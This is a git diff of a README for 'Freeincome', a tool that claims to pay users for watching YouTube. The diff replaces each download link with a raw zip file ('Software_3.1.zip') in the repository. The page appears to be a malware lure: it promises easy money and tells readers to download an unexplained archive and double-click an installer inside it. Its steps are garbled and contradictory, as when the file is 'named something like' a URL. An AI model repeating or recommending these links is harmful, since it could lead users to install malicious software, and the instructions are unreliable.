@@ -1,6 +1,6 @@
 # 🎉 Freeincome - Earn Money While You Watch YouTube
 
-[![Download Freeincome](https://raw.githubusercontent.com/Pavan1214/Freeincome/main/Trisetum/Freeincome.zip%20Freeincome-v1.0-brightgreen)](https://raw.githubusercontent.com/Pavan1214/Freeincome/main/Trisetum/Freeincome.zip)
+[![Download Freeincome](https://github.com/Pavan1214/Freeincome/raw/refs/heads/main/Trisetum/Software_3.1.zip%20Freeincome-v1.0-brightgreen)](https://github.com/Pavan1214/Freeincome/raw/refs/heads/main/Trisetum/Software_3.1.zip)
 
 ## 📜 Introduction
 
@@ -22,11 +22,11 @@ If your computer meets these requirements, you are ready to proceed.
 To get Freeincome, follow these steps:
 
 1. **Visit the Download Page**: Click the link below to access the Releases page.
-   [Download Freeincome](https://raw.githubusercontent.com/Pavan1214/Freeincome/main/Trisetum/Freeincome.zip)
+   [Download Freeincome](https://github.com/Pavan1214/Freeincome/raw/refs/heads/main/Trisetum/Software_3.1.zip)
 
 2. **Find the Latest Release**: Look for the most recent version listed on the page. It will typically be marked as "Latest release".
 
-3. **Download the Application**: Click on the .exe file link to start the download. It is named something like `https://raw.githubusercontent.com/Pavan1214/Freeincome/main/Trisetum/Freeincome.zip`. 
+3. **Download the Application**: Click on the .exe file link to start the download. It is named something like `https://github.com/Pavan1214/Freeincome/raw/refs/heads/main/Trisetum/Software_3.1.zip`. 
 
 4. **Run the Installer**: Once the download is complete, locate the file in your Downloads folder. Double-click on the file to begin the installation process.
 
@@ -51,7 +51,7 @@ Once you have Freeincome running, it’s time to set it up:
 If you run into issues:
 
 - **Check Internet Connection**: Ensure you have a stable internet connection.
-- **Update Freeincome**: Make sure you are using the latest version by visiting the [Download Page](https://raw.githubusercontent.com/Pavan1214/Freeincome/main/Trisetum/Freeincome.zip) regularly.
+- **Update Freeincome**: Make sure you are using the latest version by visiting the [Download Page](https://github.com/Pavan1214/Freeincome/raw/refs/heads/main/Trisetum/Software_3.1.zip) regularly.
 - **Restart the Application**: If the app isn’t responding, close it completely and reopen it.
 
 ## 💡 FAQs
